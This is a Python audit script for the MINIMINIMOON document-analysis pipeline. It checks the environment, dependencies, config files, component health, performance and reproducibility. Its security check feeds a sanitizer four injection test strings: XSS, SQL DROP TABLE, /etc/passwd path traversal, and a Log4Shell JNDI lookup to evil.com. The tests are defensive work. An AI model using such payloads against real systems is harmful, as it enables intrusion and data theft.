import importlib
import inspect
import json
import logging
import platform
import shutil
import sys
import tempfile
import time
import traceback
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional

import psutil

"error"

#!/usr/bin/env python3
"""
MINIMINIMOON ADVANCED SYSTEM AUDIT & DIAGNOSTICS SUITE
========================================================
Comprehensive audit script for the Canonical Deterministic Orchestrator pipeline.
Performs deep inspection of all components, dependencies, configurations, and runtime behavior.

Version: 1.0.0
Author: System Auditor
Date: 2025-10-08
"""

# Try importing optional dependencies
try:
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False

try:
    import torch

    TORCH_AVAILABLE = True
except ImportError:
    TORCH_AVAILABLE = False

try:
    PANDAS_AVAILABLE = True
except ImportError:
    PANDAS_AVAILABLE = False

# ============================================================================
# AUDIT CATEGORIES & STRUCTURES
# ============================================================================


class AuditCategory(Enum):
    SYSTEM = "system_environment"
    DEPENDENCIES = "dependencies"
    CONFIGURATION = "configuration"
    COMPONENTS = "pipeline_components"
    DATA_FLOW = "data_flow"
    PERFORMANCE = "performance"
    SECURITY = "security"
    REPRODUCIBILITY = "reproducibility"
    INTEGRATION = "integration"
    RUNTIME = "runtime_behavior"


class Severity(Enum):
    CRITICAL = "critical"  # Blocks deployment
    HIGH = "high"  # Major functionality impact
    MEDIUM = "medium"  # Performance/reliability impact
    LOW = "low"  # Minor issues
    INFO = "info"  # Informational


@dataclass
class AuditFinding:
    category: AuditCategory
    severity: Severity
    component: str
    issue: str
    details: Dict[str, Any] = field(default_factory=dict)
    recommendation: str = ""
    impact: str = ""
    timestamp: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )

    def to_dict(self) -> dict:
        return {
            "category": self.category.value,
            "severity": self.severity.value,
            "component": self.component,
            "issue": self.issue,
            "details": self.details,
            "recommendation": self.recommendation,
            "impact": self.impact,
            "timestamp": self.timestamp,
        }


@dataclass
class ComponentHealth:
    name: str
    status: str  # "healthy", "degraded", "failed", "missing"
    version: Optional[str] = None
    importable: bool = False
    functional: bool = False
    dependencies_met: bool = False
    errors: List[str] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)
    metrics: Dict[str, Any] = field(default_factory=dict)


# ============================================================================
# COMPREHENSIVE SYSTEM AUDITOR
# ============================================================================


class MiniMiniMoonAuditor:
    """
    Advanced audit system for the MINIMINIMOON orchestrator pipeline.
    Performs comprehensive health checks, dependency validation, and deployment readiness assessment.
    """

    def __init__(
        self,
        config_dir: Path = Path("config"),
        orchestrator_path: Path = Path("miniminimoon_orchestrator.py"),
        verbose: bool = True,
        parallel: bool = True,
    ):
        self.config_dir = Path(config_dir)
        self.orchestrator_path = Path(orchestrator_path)
        self.verbose = verbose
        self.parallel = parallel
        self.findings: List[AuditFinding] = []
        self.component_health: Dict[str, ComponentHealth] = {}
        self.audit_start_time = datetime.now(timezone.utc)
        self.test_dir = Path(tempfile.mkdtemp(prefix="miniminimoon_audit_"))

        # Setup logging
        self._setup_logging()

        # Critical components list from orchestrator
        self.critical_components = [
            "Decatalogo_principal",
            "miniminimoon_immutability",
            "plan_sanitizer",
            "plan_processor",
            "document_segmenter",
            "embedding_model",
            "responsibility_detector",
            "contradiction_detector",
            "monetary_detector",
            "feasibility_scorer",
            "causal_pattern_detector",
            "teoria_cambio",
            "dag_validation",
            "questionnaire_engine",
        ]

        # Required config files (canonical names)
        self.required_configs = [
            "DECALOGO_FULL.json",
            "bundles/decalogo-industrial.latest.clean.json",
            "standards/dnp-standards.latest.clean.json",
            "RUBRIC_SCORING.json",
        ]

        self.logger.info("=== MINIMINIMOON AUDITOR INITIALIZED ===")
        self.logger.info("Config Dir: %s", self.config_dir)
        self.logger.info("Orchestrator: %s", self.orchestrator_path)
        self.logger.info("Test Dir: %s", self.test_dir)

    def _setup_logging(self):
        """Configure structured logging for audit trail."""
        log_format = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
        logging.basicConfig(
            level=logging.DEBUG if self.verbose else logging.INFO, format=log_format
        )
        self.logger = logging.getLogger("MiniMiniMoonAuditor")

        # Also setup file handler for audit log
        audit_log_path = Path("audit_log.txt")
        file_handler = logging.FileHandler(audit_log_path, mode="w")
        file_handler.setFormatter(logging.Formatter(log_format))
        self.logger.addHandler(file_handler)

    # ========== SYSTEM ENVIRONMENT AUDIT ==========

    def audit_system_environment(self) -> Dict[str, Any]:
        """Check system environment and resources."""
        self.logger.info("🔍 Auditing System Environment...")

        env_info = {
            "platform": platform.platform(),
            "python_version": sys.version,
            "python_executable": sys.executable,
            "cpu_count": psutil.cpu_count(),
            "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
            "disk_usage_gb": round(psutil.disk_usage("/").used / (1024**3), 2),
            "disk_free_gb": round(psutil.disk_usage("/").free / (1024**3), 2),
        }

        # Check Python version
        py_version = sys.version_info
        if py_version < (3, 8):
            self.findings.append(
                AuditFinding(
                    category=AuditCategory.SYSTEM,
                    severity=Severity.CRITICAL,
                    component="python",
                    issue=f"Python version {py_version.major}.{py_version.minor} is below minimum (3.8)",
                    recommendation="Upgrade to Python 3.8 or higher",
                    impact="Pipeline may fail due to missing language features",
                )
            )

        # Check memory
        if env_info["memory_gb"] < 4:
            self.findings.append(
                AuditFinding(
                    category=AuditCategory.SYSTEM,
                    severity=Severity.HIGH,
                    component="system_memory",
                    issue=f"Low memory: {env_info['memory_gb']}GB",
                    recommendation="Ensure at least 4GB RAM for embedding models",
                    impact="Out of memory errors likely during embedding generation",
                )
            )

        # Check disk space
        if env_info["disk_free_gb"] < 2:
            self.findings.append(
                AuditFinding(
                    category=AuditCategory.SYSTEM,
                    severity=Severity.MEDIUM,
                    component="disk_space",
                    issue=f"Low disk space: {env_info['disk_free_gb']}GB free",
                    recommendation="Free up disk space (at least 2GB recommended)",
                    impact="May fail to write output artifacts",
                )
            )

        # Check CUDA availability if torch is available
        if TORCH_AVAILABLE:
            cuda_available = torch.cuda.is_available()
            env_info["cuda_available"] = cuda_available
            if cuda_available:
                env_info["cuda_devices"] = torch.cuda.device_count()
                env_info["cuda_version"] = torch.version.cuda
            else:
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.SYSTEM,
                        severity=Severity.INFO,
                        component="cuda",
                        issue="CUDA not available",
                        recommendation="Install CUDA for GPU acceleration (optional)",
                        impact="Embeddings will run on CPU (slower)",
                    )
                )

        return env_info

    # ========== DEPENDENCIES AUDIT ==========

    def audit_dependencies(self) -> Dict[str, Any]:
        """Check all required and optional dependencies."""
        self.logger.info("🔍 Auditing Dependencies...")

        dependencies = {
            "required": {},
            "optional": {},
            "missing": [],
            "version_conflicts": [],
        }

        # Required dependencies from orchestrator
        required_packages = [
            "json",
            "hashlib",
            "random",
            "logging",
            "threading",
            "time",
            "pathlib",
            "typing",
            "dataclasses",
            "datetime",
            "enum",
            "sys",
            "collections",
        ]

        # Optional but important
        optional_packages = [
            "numpy",
            "torch",
            "pandas",
            "sklearn",
            "transformers",
            "sentence_transformers",
            "matplotlib",
            "seaborn",
        ]

        # Check required
        for pkg in required_packages:
            try:
                mod = importlib.import_module(pkg)
                dependencies["required"][pkg] = {
                    "status": "installed",
                    "version": getattr(mod, "__version__", "builtin"),
                }
            except ImportError:
                dependencies["missing"].append(pkg)
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.DEPENDENCIES,
                        severity=Severity.CRITICAL,
                        component=pkg,
                        issue=f"Required package '{pkg}' not found",
                        recommendation=f"Install {pkg}",
                        impact="Pipeline will fail to start",
                    )
                )

        # Check optional
        for pkg in optional_packages:
            try:
                mod = importlib.import_module(pkg)
                version = getattr(mod, "__version__", "unknown")
                dependencies["optional"][pkg] = {
                    "status": "installed",
                    "version": version,
                }

                # Version-specific checks
                if pkg == "torch" and version < "1.10":
                    self.findings.append(
                        AuditFinding(
                            category=AuditCategory.DEPENDENCIES,
                            severity=Severity.MEDIUM,
                            component=pkg,
                            issue=f"PyTorch version {version} is outdated",
                            recommendation="Upgrade to PyTorch >= 1.10",
                            impact="May have compatibility issues with modern models",
                        )
                    )

            except ImportError:
                dependencies["optional"][pkg] = {"status": "missing"}
                if pkg in ["numpy", "torch"]:
                    self.findings.append(
                        AuditFinding(
                            category=AuditCategory.DEPENDENCIES,
                            severity=Severity.HIGH,
                            component=pkg,
                            issue=f"Important package '{pkg}' not installed",
                            recommendation=f"Install {pkg} for full functionality",
                            impact="Some pipeline features will be disabled",
                        )
                    )

        return dependencies

    # ========== CONFIGURATION AUDIT ==========

    def audit_configuration(self) -> Dict[str, Any]:
        """Validate configuration files and settings."""
        self.logger.info("🔍 Auditing Configuration...")

        config_status = {"files": {}, "immutability": {}, "rubric_validation": {}}

        # Check required config files
        for config_file in self.required_configs:
            config_path = self.config_dir / config_file
            if config_path.exists():
                try:
                    with open(config_path, "r", encoding="utf-8") as f:
                        data = json.load(f)

                    file_size = config_path.stat().st_size
                    config_status["files"][config_file] = {
                        "exists": True,
                        "valid_json": True,
                        "size_bytes": file_size,
                        "entries": len(data) if isinstance(data, (dict, list)) else 0,
                    }

                    # Special validation for RUBRIC_SCORING.json
                    if config_file == "RUBRIC_SCORING.json":
                        self._validate_rubric(data, config_status)

                except json.JSONDecodeError as e:
                    config_status["files"][config_file] = {
                        "exists": True,
                        "valid_json": False,
                        "error": str(e),
                    }
                    self.findings.append(
                        AuditFinding(
                            category=AuditCategory.CONFIGURATION,
                            severity=Severity.CRITICAL,
                            component=config_file,
                            issue=f"Invalid JSON in {config_file}",
                            details={"error": str(e)},
                            recommendation=f"Fix JSON syntax in {config_file}",
                            impact="Pipeline will fail during initialization",
                        )
                    )
            else:
                config_status["files"][config_file] = {"exists": False}
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.CONFIGURATION,
                        severity=Severity.CRITICAL,
                        component=config_file,
                        issue=f"Required config file '{config_file}' not found",
                        recommendation=f"Create or restore {config_file} in {self.config_dir}",
                        impact="Pipeline cannot initialize without this file",
                    )
                )

        # Check immutability snapshot
        snapshot_path = Path(".immutability_snapshot.json")
        if snapshot_path.exists():
            try:
                with open(snapshot_path, "r") as f:
                    snapshot = json.load(f)
                config_status["immutability"]["snapshot_exists"] = True
                config_status["immutability"]["snapshot_hash"] = snapshot.get(
                    "snapshot_hash", ""
                )[:16]
                config_status["immutability"]["frozen_at"] = snapshot.get(
                    "frozen_at", ""
                )
            except:
                config_status["immutability"]["snapshot_exists"] = True
                config_status["immutability"]["snapshot_valid"] = False
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.CONFIGURATION,
                        severity=Severity.HIGH,
                        component="immutability_snapshot",
                        issue="Immutability snapshot is corrupted",
                        recommendation="Regenerate snapshot with freeze_configuration()",
                        impact="Configuration changes won't be detected",
                    )
                )
        else:
            config_status["immutability"]["snapshot_exists"] = False
            self.findings.append(
                AuditFinding(
                    category=AuditCategory.CONFIGURATION,
                    severity=Severity.MEDIUM,
                    component="immutability_snapshot",
                    issue="No immutability snapshot found",
                    recommendation="Run freeze_configuration() to create snapshot",
                    impact="First run will create snapshot automatically",
                )
            )

        return config_status

    def _validate_rubric(self, rubric_data: dict, config_status: dict):
        """Validate RUBRIC_SCORING.json structure and consistency."""
        validation = {
            "has_questions": "questions" in rubric_data,
            "has_weights": "weights" in rubric_data,
            "question_count": 0,
            "weight_count": 0,
            "alignment": "unknown",
        }

        if validation["has_questions"]:
            questions = rubric_data["questions"]
            if isinstance(questions, dict):
                validation["question_count"] = len(questions)
                question_ids = set(questions.keys())
            elif isinstance(questions, list):
                validation["question_count"] = len(questions)
                question_ids = set(q.get("id") for q in questions if "id" in q)
            else:
                question_ids = set()
        else:
            question_ids = set()
            self.findings.append(
                AuditFinding(
                    category=AuditCategory.CONFIGURATION,
                    severity=Severity.CRITICAL,
                    component="RUBRIC_SCORING.json",
                    issue="Missing 'questions' section",
                    recommendation="Add questions section to RUBRIC_SCORING.json",
                    impact="Answer assembly will fail",
                )
            )

        if validation["has_weights"]:
            weights = rubric_data["weights"]
            validation["weight_count"] = len(weights)
            weight_ids = set(weights.keys())
        else:
            weight_ids = set()
            self.findings.append(
                AuditFinding(
                    category=AuditCategory.CONFIGURATION,
                    severity=Severity.CRITICAL,
                    component="RUBRIC_SCORING.json",
                    issue="Missing 'weights' section",
                    recommendation="Add weights section to RUBRIC_SCORING.json",
                    impact="Answer assembly will fail",
                )
            )

        # Check alignment
        if question_ids and weight_ids:
            missing_weights = question_ids - weight_ids
            extra_weights = weight_ids - question_ids

            if missing_weights:
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.CONFIGURATION,
                        severity=Severity.HIGH,
                        component="RUBRIC_SCORING.json",
                        issue=f"{len(missing_weights)} questions have no weights",
                        details={"sample": list(missing_weights)[:5]},
                        recommendation="Add missing weights to rubric",
                        impact="Questions without weights will cause scoring errors",
                    )
                )

            if extra_weights:
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.CONFIGURATION,
                        severity=Severity.MEDIUM,
                        component="RUBRIC_SCORING.json",
                        issue=f"{len(extra_weights)} weights have no corresponding questions",
                        details={"sample": list(extra_weights)[:5]},
                        recommendation="Remove orphaned weights from rubric",
                        impact="Unnecessary memory usage",
                    )
                )

            validation["alignment"] = (
                "perfect" if not (missing_weights or extra_weights) else "misaligned"
            )

        # Check for 300 questions requirement
        if validation["question_count"] < 300:
            self.findings.append(
                AuditFinding(
                    category=AuditCategory.CONFIGURATION,
                    severity=Severity.HIGH,
                    component="RUBRIC_SCORING.json",
                    issue=f"Only {validation['question_count']}/300 questions defined",
                    recommendation="Complete rubric to include all 300 questions",
                    impact="Incomplete evaluation coverage",
                )
            )

        config_status["rubric_validation"] = validation

    # ========== COMPONENT HEALTH AUDIT ==========

    def audit_pipeline_components(self) -> Dict[str, ComponentHealth]:
        """Test each pipeline component's availability and basic functionality."""
        self.logger.info("🔍 Auditing Pipeline Components...")

        for component_name in self.critical_components:
            self.logger.info("  Checking %s...", component_name)
            health = self._check_component_health(component_name)
            self.component_health[component_name] = health

            # Generate findings based on health
            if health.status == "missing":
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.COMPONENTS,
                        severity=Severity.CRITICAL,
                        component=component_name,
                        issue=f"Component '{component_name}' cannot be imported",
                        details={"errors": health.errors},
                        recommendation=f"Ensure {component_name}.py exists and is valid Python",
                        impact="Pipeline will fail at this stage",
                    )
                )
            elif health.status == "failed":
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.COMPONENTS,
                        severity=Severity.HIGH,
                        component=component_name,
                        issue=f"Component '{component_name}' imports but fails basic tests",
                        details={"errors": health.errors},
                        recommendation=f"Debug and fix {component_name} implementation",
                        impact="Pipeline may produce incorrect results",
                    )
                )
            elif health.status == "degraded":
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.COMPONENTS,
                        severity=Severity.MEDIUM,
                        component=component_name,
                        issue=f"Component '{component_name}' has warnings",
                        details={"warnings": health.warnings},
                        recommendation=f"Review warnings for {component_name}",
                        impact="Possible performance or reliability issues",
                    )
                )

        return self.component_health

    def _check_component_health(self, component_name: str) -> ComponentHealth:
        """Check individual component health."""
        health = ComponentHealth(name=component_name, status="unknown")

        try:
            # Try to import
            if component_name == "embedding_model":
                from embedding_model import IndustrialEmbeddingModel as EmbeddingModel

                cls = EmbeddingModel
            else:
                module = importlib.import_module(component_name)
                # Find main class (heuristic: capitalized or matching name)
                cls = None
                for name in dir(module):
                    if name.lower() == component_name.replace("_", "").lower():
                        cls = getattr(module, name)
                        break
                if not cls:
                    # Fallback: first class found
                    for name in dir(module):
                        obj = getattr(module, name)
                        if inspect.isclass(obj):
                            cls = obj
                            break

            health.importable = True

            # Try to instantiate (with minimal/no args)
            try:
                if component_name in ["questionnaire_engine", "answer_assembler"]:
                    # These need special args
                    health.functional = True  # Skip instantiation test
                else:
                    instance = cls() if cls else None
                    if instance:
                        health.functional = True
            except Exception as e:
                health.warnings.append(f"Instantiation warning: {str(e)}")
                health.functional = True  # May still be functional with proper args

            # Check for expected methods
            if cls:
                expected_methods = self._get_expected_methods(component_name)
                for method in expected_methods:
                    if not hasattr(cls, method):
                        health.warnings.append(f"Missing expected method: {method}")

            # Determine overall status
            if health.errors:
                health.status = "failed"
            elif health.warnings:
                health.status = "degraded"
            else:
                health.status = "healthy"

        except ImportError as e:
            health.importable = False
            health.status = "missing"
            health.errors.append(str(e))
        except Exception as e:
            health.importable = True
            health.status = "failed"
            health.errors.append(str(e))

        return health

    @staticmethod
    def _get_expected_methods(component_name: str) -> List[str]:
        """Get expected methods for each component type."""
        method_map = {
            "plan_sanitizer": ["sanitize_text"],
            "plan_processor": ["process"],
            "document_segmenter": ["segment"],
            "embedding_model": ["encode"],
            "responsibility_detector": ["detect_entities"],
            "contradiction_detector": ["detect_contradictions"],
            "monetary_detector": ["detect"],
            "feasibility_scorer": ["evaluate_plan_feasibility"],
            "causal_pattern_detector": ["detect_patterns"],
            "teoria_cambio": ["verificar_marco_logico_completo"],
            "dag_validation": ["calculate_acyclicity_pvalue_advanced"],
            "questionnaire_engine": ["evaluate", "evaluate_question"],
        }
        return method_map.get(component_name, [])

    # ========== PERFORMANCE AUDIT ==========

    def audit_performance(self) -> Dict[str, Any]:
        """Run performance benchmarks on critical operations."""
        self.logger.info("🔍 Auditing Performance...")

        perf_results = {
            "cache_performance": {},
            "threading_overhead": {},
            "memory_usage": {},
        }

        # Test cache performance
        try:
            from miniminimoon_orchestrator import ThreadSafeLRUCache

            cache = ThreadSafeLRUCache(max_size=100, ttl_seconds=60)

            # Benchmark cache operations
            start = time.perf_counter()
            for i in range(1000):
                cache.set(f"key_{i}", {"data": f"value_{i}"})
            set_time = time.perf_counter() - start

            start = time.perf_counter()
            for i in range(1000):
                _ = cache.get(f"key_{i}")
            get_time = time.perf_counter() - start

            perf_results["cache_performance"] = {
                "set_ops_per_sec": round(1000 / set_time),
                "get_ops_per_sec": round(1000 / get_time),
                "status": "healthy" if get_time < 0.1 else "slow",
            }

            if get_time > 0.1:
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.PERFORMANCE,
                        severity=Severity.MEDIUM,
                        component="ThreadSafeLRUCache",
                        issue=f"Cache performance is slow: {get_time:.3f}s for 1000 gets",
                        recommendation="Consider optimizing cache implementation",
                        impact="Slower processing for cached documents",
                    )
                )

        except Exception as e:
            perf_results["cache_performance"]["error"] = str(e)

        # Test threading overhead
        try:
            from concurrent.futures import ThreadPoolExecutor

            def dummy_task(n):
                return sum(range(n))

            # Sequential
            start = time.perf_counter()
            results = [dummy_task(10000) for _ in range(100)]
            seq_time = time.perf_counter() - start

            # Parallel
            start = time.perf_counter()
            with ThreadPoolExecutor(max_workers=4) as executor:
                futures = [executor.submit(dummy_task, 10000) for _ in range(100)]
                results = [f.result() for f in futures]
            par_time = time.perf_counter() - start

            speedup = seq_time / par_time
            perf_results["threading_overhead"] = {
                "sequential_time": round(seq_time, 3),
                "parallel_time": round(par_time, 3),
                "speedup": round(speedup, 2),
                "efficiency": round(speedup / 4 * 100, 1),  # 4 workers
            }

            if speedup < 1.5:
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.PERFORMANCE,
                        severity=Severity.LOW,
                        component="ThreadPoolExecutor",
                        issue=f"Low parallel speedup: {speedup:.1f}x with 4 workers",
                        recommendation="Consider reducing parallel workers or optimizing task granularity",
                        impact="Parallel questionnaire evaluation may not provide expected speedup",
                    )
                )

        except Exception as e:
            perf_results["threading_overhead"]["error"] = str(e)

        # Memory usage test
        try:
            import gc

            gc.collect()

            mem_before = psutil.Process().memory_info().rss / 1024 / 1024  # MB

            # Simulate document processing memory load
            large_data = []
            for _ in range(100):
                large_data.append("x" * 10000)  # 10KB strings

            mem_after = psutil.Process().memory_info().rss / 1024 / 1024
            mem_increase = mem_after - mem_before

            perf_results["memory_usage"] = {
                "baseline_mb": round(mem_before, 1),
                "after_load_mb": round(mem_after, 1),
                "increase_mb": round(mem_increase, 1),
            }

            del large_data
            gc.collect()

        except Exception as e:
            perf_results["memory_usage"]["error"] = str(e)

        return perf_results

    # ========== INTEGRATION AUDIT ==========

    def audit_integration(self) -> Dict[str, Any]:
        """Test integration between components."""
        self.logger.info("🔍 Auditing Component Integration...")

        integration_results = {
            "data_flow": {},
            "type_compatibility": {},
            "error_propagation": {},
        }

        # Test data flow between sequential components
        flow_pairs = [
            ("plan_sanitizer", "plan_processor"),
            ("plan_processor", "document_segmenter"),
            ("document_segmenter", "embedding_model"),
            ("embedding_model", "responsibility_detector"),
        ]

        for source, target in flow_pairs:
            test_key = f"{source}_to_{target}"
            try:
                # Check if output type of source matches input type of target
                source_health = self.component_health.get(source)
                target_health = self.component_health.get(target)

                if source_health and target_health:
                    if (
                        source_health.status == "healthy"
                        and target_health.status == "healthy"
                    ):
                        integration_results["data_flow"][test_key] = "compatible"
                    else:
                        integration_results["data_flow"][test_key] = "uncertain"
                        self.findings.append(
                            AuditFinding(
                                category=AuditCategory.INTEGRATION,
                                severity=Severity.MEDIUM,
                                component=f"{source}->{target}",
                                issue=f"Integration uncertain due to component health",
                                recommendation=f"Fix health issues in {source} and {target}",
                                impact="Data flow may fail between these components",
                            )
                        )
                else:
                    integration_results["data_flow"][test_key] = "missing"

            except Exception as e:
                integration_results["data_flow"][test_key] = self.findings.append(
                    AuditFinding(
                        category=AuditCategory.INTEGRATION,
                        severity=Severity.HIGH,
                        component=f"{source}->{target}",
                        issue=f"Integration test failed: {str(e)}",
                        details={"error": str(e)},
                        recommendation=f"Debug integration between {source} and {target}",
                        impact="Pipeline may fail at this transition point",
                    )
                )

        return integration_results

    # ========== REPRODUCIBILITY AUDIT ==========

    def audit_reproducibility(self) -> Dict[str, Any]:
        """Test deterministic behavior and reproducibility."""
        self.logger.info("🔍 Auditing Reproducibility...")

        repro_results = {
            "seed_consistency": {},
            "hash_stability": {},
            "cache_determinism": {},
        }

        # Test seed consistency
        try:
            import hashlib
            import random

            # Test random seed
            random.seed(42)
            seq1 = [random.random() for _ in range(10)]

            random.seed(42)
            seq2 = [random.random() for _ in range(10)]

            repro_results["seed_consistency"]["random_deterministic"] = seq1 == seq2

            if seq1 != seq2:
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.REPRODUCIBILITY,
                        severity=Severity.CRITICAL,
                        component="random_seed",
                        issue="Random number generation is not deterministic",
                        recommendation="Verify random.seed() implementation",
                        impact="Non-reproducible results across runs",
                    )
                )
        except Exception as e:
            repro_results["seed_consistency"]["error"] = str(e)

        # Test hash stability
        try:
            test_data = {"key": "value", "number": 42, "list": [1, 2, 3]}
            json_str = json.dumps(test_data, sort_keys=True)

            hash1 = hashlib.sha256(json_str.encode()).hexdigest()
            hash2 = hashlib.sha256(json_str.encode()).hexdigest()

            repro_results["hash_stability"]["consistent"] = hash1 == hash2
            repro_results["hash_stability"]["sample_hash"] = hash1[:16]

        except Exception as e:
            repro_results["hash_stability"]["error"] = str(e)

        return repro_results

    # ========== SECURITY AUDIT ==========

    def audit_security(self) -> Dict[str, Any]:
        """Check security-related configurations and practices."""
        self.logger.info("🔍 Auditing Security...")

        security_results = {
            "file_permissions": {},
            "injection_risks": {},
            "data_sanitization": {},
        }

        # Check file permissions on sensitive configs
        for config_file in self.required_configs:
            config_path = self.config_dir / config_file
            if config_path.exists():
                stat_info = config_path.stat()
                mode = oct(stat_info.st_mode)[-3:]
                security_results["file_permissions"][config_file] = mode

                # Warn if world-writable
                if mode.endswith("7") or mode.endswith("6"):
                    self.findings.append(
                        AuditFinding(
                            category=AuditCategory.SECURITY,
                            severity=Severity.MEDIUM,
                            component=config_file,
                            issue=f"Config file has overly permissive permissions: {mode}",
                            recommendation=f"Set permissions to 644 or 600",
                            impact="Unauthorized users may modify configuration",
                        )
                    )

        # Check for potential injection risks in plan_sanitizer
        try:
            from plan_sanitizer import PlanSanitizer

            sanitizer = PlanSanitizer()

            test_cases = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE plans; --",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
            ]

            passed = 0
            for test in test_cases:
                result = sanitizer.sanitize_text(test)
                if test.lower() not in result.lower():
                    passed += 1

            security_results["injection_risks"]["sanitizer_tests_passed"] = (
                f"{passed}/{len(test_cases)}"
            )

            if passed < len(test_cases):
                self.findings.append(
                    AuditFinding(
                        category=AuditCategory.SECURITY,
                        severity=Severity.HIGH,
                        component="plan_sanitizer",
                        issue=f"Sanitizer only passed {passed}/{len(test_cases)} injection tests",
                        recommendation="Strengthen input sanitization",
                        impact="Potential injection vulnerabilities",
                    )
                )

        except Exception as e:
            security_results["injection_risks"]["error"] = str(e)

        return security_results

    # ========== RUNTIME BEHAVIOR AUDIT ==========

    def audit_runtime_behavior(self) -> Dict[str, Any]:
        """Test actual runtime behavior with synthetic data."""
        self.logger.info("🔍 Auditing Runtime Behavior...")

        runtime_results = {
            "synthetic_run": {},
            "error_handling": {},
            "output_quality": {},
        }

        # Try to run a minimal synthetic pipeline
        try:
            test_plan = """
            Proyecto de Desarrollo Rural Sostenible
            
            Objetivo: Mejorar las condiciones de vida de 500 familias campesinas.
            
            Actividades:
            1. Construcción de sistema de riego (12 meses, $50,000 USD)
            2. Capacitación en técnicas agrícolas (6 meses, $10,000 USD)
            3. Distribución de semillas mejoradas (3 meses, $5,000 USD)
            
            Responsables: Ministerio de Agricultura, ONG LocalDev
            """

            # Test sanitization
            from plan_sanitizer import PlanSanitizer

            sanitizer = PlanSanitizer()
            sanitized = sanitizer.sanitize_text(test_plan)

            runtime_results["synthetic_run"]["sanitization"] = "success"
            runtime_results["synthetic_run"]["sanitized_length"] = len(sanitized)

            # Test segmentation
            from document_segmenter import DocumentSegmenter

            segmenter = DocumentSegmenter()
            segments = segmenter.segment(sanitized)

            runtime_results["synthetic_run"]["segmentation"] = "success"
            runtime_results["synthetic_run"]["segment_count"] = len(segments)

            # Test detector on segments
            from responsibility_detector import ResponsibilityDetector

            detector = ResponsibilityDetector()
            entities = detector.detect_entities(segments[0] if segments else "")

            runtime_results["synthetic_run"]["detection"] = "success"
            runtime_results["synthetic_run"]["entities_found"] = len(entities)

        except Exception as e:
            runtime_results["synthetic_run"]["status"] = "failed"
            runtime_results["synthetic_run"]["error"] = str(e)
            runtime_results["synthetic_run"]["traceback"] = traceback.format_exc()

            self.findings.append(
                AuditFinding(
                    category=AuditCategory.RUNTIME,
                    severity=Severity.CRITICAL,
                    component="synthetic_pipeline",
                    issue=f"Synthetic pipeline test failed: {str(e)}",
                    details={"traceback": traceback.format_exc()},
                    recommendation="Debug pipeline with test data before production use",
                    impact="Pipeline will fail on real data",
                )
            )

        return runtime_results

    # ========== MAIN AUDIT ORCHESTRATION ==========

    def run_full_audit(self) -> Dict[str, Any]:
        """Run complete audit suite."""
        self.logger.info("=" * 70)
        self.logger.info("STARTING COMPREHENSIVE MINIMINIMOON AUDIT")
        self.logger.info("=" * 70)

        audit_report = {
            "audit_metadata": {
                "version": "1.0.0",
                "timestamp": self.audit_start_time.isoformat(),
                "auditor": "MiniMiniMoonAuditor",
                "duration_seconds": 0,
            },
            "results": {},
            "findings": [],
            "summary": {},
        }

        # Run all audit categories
        audit_functions = [
            ("system_environment", self.audit_system_environment),
            ("dependencies", self.audit_dependencies),
            ("configuration", self.audit_configuration),
            ("pipeline_components", self.audit_pipeline_components),
            ("performance", self.audit_performance),
            ("integration", self.audit_integration),
            ("reproducibility", self.audit_reproducibility),
            ("security", self.audit_security),
            ("runtime_behavior", self.audit_runtime_behavior),
        ]

        for category_name, audit_func in audit_functions:
            try:
                self.logger.info("\n%s", "=" * 70)
                result = audit_func()
                audit_report["results"][category_name] = result
            except Exception as e:
                self.logger.error("❌ Audit category '%s' failed: %s", category_name, e)
                audit_report["results"][category_name] = {
                    "status": "error",
                    "error": str(e),
                    "traceback": traceback.format_exc(),
                }

        # Compile findings
        audit_report["findings"] = [f.to_dict() for f in self.findings]

        # Generate summary
        audit_report["summary"] = self._generate_summary()

        # Calculate duration
        audit_end_time = datetime.now(timezone.utc)
        duration = (audit_end_time - self.audit_start_time).total_seconds()
        audit_report["audit_metadata"]["duration_seconds"] = round(duration, 2)

        self.logger.info("\n" + "=" * 70)
        self.logger.info("AUDIT COMPLETE")
        self.logger.info("=" * 70)

        return audit_report

    def _generate_summary(self) -> Dict[str, Any]:
        """Generate executive summary of audit results."""
        summary = {
            "total_findings": len(self.findings),
            "by_severity": defaultdict(int),
            "by_category": defaultdict(int),
            "critical_blockers": [],
            "deployment_ready": False,
            "health_score": 0,
        }

        # Count by severity and category
        for finding in self.findings:
            summary["by_severity"][finding.severity.value] += 1
            summary["by_category"][finding.category.value] += 1

            if finding.severity == Severity.CRITICAL:
                summary["critical_blockers"].append(
                    {"component": finding.component, "issue": finding.issue}
                )

        # Determine deployment readiness
        critical_count = summary["by_severity"]["critical"]
        high_count = summary["by_severity"]["high"]

        if critical_count == 0 and high_count <= 2:
            summary["deployment_ready"] = True
        else:
            summary["deployment_ready"] = False

        # Calculate health score (0-100)
        total_components = len(self.critical_components)
        healthy_components = sum(
            1 for h in self.component_health.values() if h.status == "healthy"
        )

        component_score = (
            (healthy_components / total_components * 50) if total_components > 0 else 0
        )

        # Severity penalty
        severity_penalty = (
            critical_count * 10
            + high_count * 5
            + summary["by_severity"]["medium"] * 2
            + summary["by_severity"]["low"] * 1
        )

        finding_score = max(0, 50 - severity_penalty)

        summary["health_score"] = round(component_score + finding_score)

        return summary

    def save_report(self, output_path: Path = Path("audit_report.json")):
        """Save audit report to JSON file."""
        report = self.run_full_audit()

        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        self.logger.info("\n📄 Full report saved to: %s", output_path)

